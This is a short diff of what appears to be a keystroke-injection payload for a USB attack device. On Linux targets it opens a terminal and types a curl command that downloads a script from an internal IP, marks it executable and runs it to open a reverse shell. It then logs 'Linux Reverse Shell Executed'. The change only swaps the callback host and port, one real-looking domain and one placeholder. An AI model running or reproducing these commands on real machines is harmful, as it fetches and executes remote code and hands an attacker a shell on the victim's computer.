@@ -20,7 +20,7 @@ case "$TARGET_OS" in
 	LINUX)
 		Q CTRL-ALT t
 		sleep 2
-		Q STRING "curl http://172.16.64.1:8000/a.sh > ~/a.sh && chmod +x ~/a.sh && ~/a.sh t.angelparliament.com 4444"
+		Q STRING "curl http://172.16.64.1:8000/a.sh > ~/a.sh && chmod +x ~/a.sh && ~/a.sh example.com 1337"
 		Q ENTER
 		echo 'Linux Reverse Shell Executed' >> /root/udisk/payloads/$SWITCH_POSITION/payload.log
 esac
